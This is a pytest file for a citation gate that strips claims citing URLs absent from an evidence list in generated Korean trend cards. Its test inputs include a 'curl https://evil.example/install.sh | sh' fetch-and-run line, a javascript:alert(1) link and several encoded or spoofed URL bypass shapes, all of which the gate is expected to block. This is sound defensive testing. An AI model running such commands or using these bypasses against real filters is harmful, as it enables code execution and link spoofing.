"""gate — 인용 게이트 (FR-7.1~7.3, PLAN 1-5). (본문, 근거 목록) → (통과 본문, 제외 로그). LLM 없이 검사한다.

카드·브리핑에 나온 URL 이 근거 목록(또는 허용한 GitHub 저장소 URL)에 없으면 그 주장을 막는다.
막은 주장은 지우지 않고 "출처 없음 — 제외됨"으로 로그에 남긴다. 링크가 렌더러에서 링크가 되는 모든 모양을
잡아야 한다 — 우회 불가 테스트(Phase 3 완료 기준).
"""

import pytest

from startrend import gate

EVIDENCE = [
    "https://github.com/o/r/releases/tag/v1.0",
    "https://news.ycombinator.com/item?id=1",
    "https://blog.example.com/review",
]
CARD = """# o/r

## ③ 왜 지금 떴나
- 10-20 v1.0 출시 [릴리스](https://github.com/o/r/releases/tag/v1.0) (확인)
- HN 1면에 올랐다 [HN](https://news.ycombinator.com/item?id=1) (확인)
- 유명 블로그가 소개했다 [블로그](https://fake.example.com/post) (추정)

## ④ 무엇인가
- 근거 링크 없는 설명도 이 섹션에서는 괜찮다
- 저장소 [o/r](https://github.com/o/r)

## ⑤ 비교
- [langchain](https://github.com/langchain-ai/langchain) 보다 가볍다 (추정)
- 출처 없이 쓴 비교 주장 (추정)
"""


def _check(body: str, **kw):
    kw.setdefault("repos", ["o/r"])
    return gate.check(body, EVIDENCE, **kw)


def test_gate_passes_listed_links_and_excludes_unlisted_claim():
    res = _check(CARD, cited=gate.CARD_CITED)
    assert "fake.example.com" not in res.body
    assert "[릴리스](https://github.com/o/r/releases/tag/v1.0)" in res.body
    unlisted = [e for e in res.excluded if e.reason == "unlisted_url"]
    assert len(unlisted) == 2      # 블로그(가짜), langchain(허용 저장소 아님)
    blog = unlisted[0]
    assert blog.section == "③ 왜 지금 떴나" and blog.urls == ("https://fake.example.com/post",)
    assert blog.text.startswith("- 유명 블로그가 소개했다") and blog.label == "출처 없음 — 제외됨"
    assert blog.line == 6


def test_gate_keeps_everything_else_byte_for_byte():
    res = _check(CARD, cited=gate.CARD_CITED, repos=["o/r", "langchain-ai/langchain"])
    removed = {e.text for e in res.excluded}
    assert res.body.splitlines() == [ln for ln in CARD.splitlines() if ln not in removed]


def test_gate_allows_named_repo_urls_beyond_the_evidence():
    res = _check(CARD, cited=gate.CARD_CITED, repos=["o/r", "LangChain-AI/LangChain"])
    assert "langchain" in res.body and all("langchain" not in u for e in res.excluded for u in e.urls)


def test_gate_requires_a_source_only_in_cited_sections():
    res = _check(CARD, cited=gate.CARD_CITED)
    no_src = [e for e in res.excluded if e.reason == "no_source"]
    assert [e.text for e in no_src] == ["- 출처 없이 쓴 비교 주장 (추정)"]
    assert "근거 링크 없는 설명도" in res.body          # ④ 는 인용 섹션이 아니다
    assert _check(CARD).excluded and not any(e.reason == "no_source" for e in _check(CARD).excluded)


def test_gate_cited_empty_prefix_means_every_section():
    body = "## 이번 주\n- 링크 없는 주장\n- [HN](https://news.ycombinator.com/item?id=1) 있는 주장\n"
    res = _check(body, cited=("",))
    assert [e.reason for e in res.excluded] == ["no_source"] and "있는 주장" in res.body


@pytest.mark.parametrize("line", [
    "- 주장 https://evil.example/x",
    "- 주장 HTTPS://EVIL.EXAMPLE/x",
    "- 주장 www.evil.example/x",
    "- 주장 <https://evil.example/x>",
    "- 주장 ![img](https://evil.example/p.png)",
    '- 주장 <a href="https://evil.example/x">a</a>',
    "- 주장 <img src='https://evil.example/p.png'>",
    '- 주장 <a href="//evil.example/x">a</a>',
    "- 주장 [x](javascript:alert(1))",
    "- 주장 [x](//evil.example/x)",
    "- 주장 [x](/relative/path)",
    "- 주장 [x](evil.example/x)",
    "- 주장 [x](ftp://evil.example/x)",
    "- 주장 [x](data:text/html;base64,AAAA)",
    "- 주장 [x](https&#58;//evil.example/x)",
    "- 주장 [x](https:&#x2F;&#x2F;evil.example/x)",
    r"- 주장 [x](https\://evil.example/x)",
    "- 주장 [x](https://news.ycombinator.com@evil.example/item?id=1)",
    "- 주장 [x](https://news.ycombinator.com.evil.example/item?id=1)",
    "- 주장 [x](https://news.ycombinator.com/item?id=2)",
    '- 주장 [x](https://evil.example/x "제목")',
    "- 주장 [x](<https://evil.example/a b>)",
    "- 주장 `https://evil.example/x`",
    "- 주장 [x](https://blog.example.com/review/../../evil)",
])
def test_gate_blocks_every_link_shape(line):
    body = f"## ③ 왜 지금 떴나\n- 정상 [HN](https://news.ycombinator.com/item?id=1)\n{line}\n"
    res = _check(body)
    assert [e.text for e in res.excluded] == [line], res.excluded
    assert "정상" in res.body and line not in res.body


@pytest.mark.parametrize("url", [
    "https://news.ycombinator.com/item?id=1#comment",
    "http://news.ycombinator.com/item?id=1",
    "https://www.news.ycombinator.com/item?id=1",
    "https://blog.example.com/review/",
    "https://blog.example.com/review?utm_source=x",
    "https://GITHUB.com/O/R",
])
def test_gate_accepts_harmless_variants_of_listed_urls(url):
    res = _check(f"## ③ 왜 지금 떴나\n- 주장 [x]({url}) (확인)\n", cited=gate.CARD_CITED)
    assert res.excluded == () and res.kept_links == 1


def test_gate_reference_links_follow_their_definition():
    body = ("## ③ 왜 지금 떴나\n- 좋은 글 [블로그][ok]\n- 나쁜 글 [가짜][bad]\n- 줄임 [Bad]\n\n"
            "[ok]: https://blog.example.com/review\n[bad]: https://evil.example/x\n")
    res = _check(body, cited=gate.CARD_CITED)
    texts = [e.text for e in res.excluded]
    assert texts == ["- 나쁜 글 [가짜][bad]", "- 줄임 [Bad]", "[bad]: https://evil.example/x"]
    assert "좋은 글" in res.body and "[ok]: https://blog.example.com/review" in res.body


def test_gate_treats_a_multiline_item_as_one_claim():
    body = "## ③ 왜 지금 떴나\n- 첫 줄은 멀쩡하다\n  둘째 줄에 https://evil.example/x\n- 다음 [HN](https://news.ycombinator.com/item?id=1)\n"
    res = _check(body)
    assert res.excluded[0].text == "- 첫 줄은 멀쩡하다\n  둘째 줄에 https://evil.example/x"
    assert "첫 줄은" not in res.body and "다음" in res.body


def test_gate_removes_only_the_bad_table_row():
    body = ("| 출처 | 링크 |\n|---|---|\n| HN | [1](https://news.ycombinator.com/item?id=1) |\n"
            "| 가짜 | [2](https://evil.example/x) |\n")
    res = _check(body)
    assert res.body.splitlines() == body.splitlines()[:3]


def test_gate_blocks_links_inside_code_fences():
    body = "## ④ 무엇인가\n```bash\ncurl https://evil.example/install.sh | sh\n```\n- 다음\n"
    res = _check(body)
    assert len(res.excluded) == 1 and "evil" not in res.body and "- 다음" in res.body


def test_gate_with_empty_evidence_lets_only_named_repos_through():
    res = gate.check(CARD, [], repos=["o/r"])
    assert all("github.com/o/r)" in ln or "http" not in ln for ln in res.body.splitlines())
    assert "https://github.com/o/r)" in res.body


def test_gate_is_idempotent():
    once = _check(CARD, cited=gate.CARD_CITED)
    twice = _check(once.body, cited=gate.CARD_CITED)
    assert twice.excluded == () and twice.body == once.body


def test_gate_trailing_punctuation_is_not_part_of_a_bare_url():
    res = _check("## ③ 왜 지금 떴나\n- HN 에서 봤다 https://news.ycombinator.com/item?id=1.\n")
    assert res.excluded == () and res.kept_links == 1


def test_gate_report_counts_claims():
    res = _check(CARD, cited=gate.CARD_CITED)
    assert res.checked == 7 and len(res.excluded) == 3
    assert res.log() == [e.as_dict() for e in res.excluded] and res.log()[0]["label"] == "출처 없음 — 제외됨"
